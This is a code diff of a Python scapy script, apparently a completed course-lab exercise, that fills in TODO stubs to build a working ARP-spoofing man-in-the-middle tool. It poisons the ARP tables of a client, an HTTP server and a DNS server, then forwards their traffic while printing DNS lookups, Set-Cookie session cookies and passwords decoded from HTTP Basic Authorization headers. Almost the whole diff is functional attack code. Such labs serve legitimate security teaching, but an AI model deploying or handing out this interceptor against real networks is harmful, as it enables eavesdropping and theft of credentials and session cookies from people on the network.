@@ -1,4 +1,6 @@
 from scapy.all import *
+from scapy.layers.http import HTTPResponse, HTTPRequest # import HTTP packet
+from base64 import b64decode
 
 import argparse
 import sys
@@ -24,27 +26,36 @@ def debug(s):
 
 # TODO: returns the mac address for an IP
 def mac(IP):
+    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=IP), timeout=3, verbose=0)
+    if ans:
+        print("# IP: ", IP, " maps to MAC: ", ans[0][1].src)
+        return ans[0][1].src
+    print("# No mac found")
     return
 
 
 #ARP spoofs client, httpServer, dnsServer
 def spoof_thread(clientIP, clientMAC, httpServerIP, httpServerMAC, dnsServerIP, dnsServerMAC, attackerIP, attackerMAC, interval=3):
     while True:
-        spoof() # TODO: Spoof client ARP table
-        spoof() # TODO: Spoof httpServer ARP table
-        spoof() # TODO: Spoof client ARP table
-        spoof() # TODO: Spoof dnsServer ARP table
+        spoof(httpServerIP, attackerMAC, clientIP, clientMAC) # TODO: Spoof client ARP table
+        spoof(dnsServerIP, attackerMAC, clientIP, clientMAC) # TODO: Spoof client ARP table
+        spoof(clientIP, attackerMAC, httpServerIP, httpServerMAC) # TODO: Spoof httpServer ARP table
+        spoof(clientIP, attackerMAC, dnsServerIP, dnsServerMAC) # TODO: Spoof dnsServer ARP table
         time.sleep(interval)
 
 
 # TODO: spoof ARP so that dst changes its ARP table entry for src 
 def spoof(srcIP, srcMAC, dstIP, dstMAC):
     debug(f"spoofing {dstIP}'s ARP table: setting {srcIP} to {srcMAC}")
+    arp_response = ARP(pdst=dstIP, hwdst=dstMAC, psrc=srcIP, hwsrc=srcMAC, op=2)
+    send(arp_response, verbose=False)
 
 
 # TODO: restore ARP so that dst changes its ARP table entry for src
 def restore(srcIP, srcMAC, dstIP, dstMAC):
     debug(f"restoring ARP table for {dstIP}")
+    arp_response = ARP(pdst=dstIP, hwdst=dstMAC, psrc=srcIP, hwsrc=srcMAC, op=2)
+    send(arp_response, verbose=False)
 
 
 # TODO: handle intercepted packets
@@ -52,6 +63,36 @@ def restore(srcIP, srcMAC, dstIP, dstMAC):
 # you will want to filter out packets that you do not intend to intercept and forward
 def interceptor(packet):
     global clientMAC, clientIP, httpServerMAC, httpServerIP, dnsServerIP, dnsServerMAC, attackerIP, attackerMAC
+    valid_ips_to_mac = {
+                clientIP: clientMAC,
+                httpServerIP: httpServerMAC,
+                dnsServerIP: dnsServerMAC,
+                attackerIP: attackerMAC
+            }
+
+    if IP in packet:
+        ip_src=packet[IP].src
+        ip_dst=packet[IP].dst
+
+        if DNS in packet and ip_src == clientIP and ip_dst == dnsServerIP:
+            print("*hostname:", packet[DNS].qd.qname.decode('utf-8'))
+
+        if DNS in packet and ip_src == dnsServerIP and ip_dst == clientIP:
+            print("*hostaddr:", packet[DNS].an.rdata)
+        
+        if HTTPResponse in packet and ip_src == httpServerIP and ip_dst == clientIP:
+            print("*cookie:", packet[HTTPResponse].Set_Cookie.decode('utf-8'))
+
+        if HTTPRequest in packet and ip_dst == httpServerIP:
+            auth = packet[HTTPRequest].Authorization
+            _, passw = b64decode(auth.split(None, 1)[1]).decode('utf-8').split(':', 1)
+            print("*basicauth:", passw)
+
+        if ip_src in valid_ips_to_mac and ip_dst in valid_ips_to_mac:
+            packet[Ether].src = attackerMAC
+            packet[Ether].dst = valid_ips_to_mac[ip_dst]
+            del packet.chksum
+            sendp(packet)
 
 
 if __name__ == "__main__":
@@ -70,6 +111,7 @@ if __name__ == "__main__":
     httpServerMAC = mac(httpServerIP)
     dnsServerMAC = mac(dnsServerIP)
     attackerMAC = get_if_hwaddr(args.interface)
+    print("# Attacker mac address: ", attackerMAC)
 
     # start a new thread to ARP spoof in a loop
     spoof_th = threading.Thread(target=spoof_thread, args=(clientIP, clientMAC, httpServerIP, httpServerMAC, dnsServerIP, dnsServerMAC, attackerIP, attackerMAC), daemon=True)
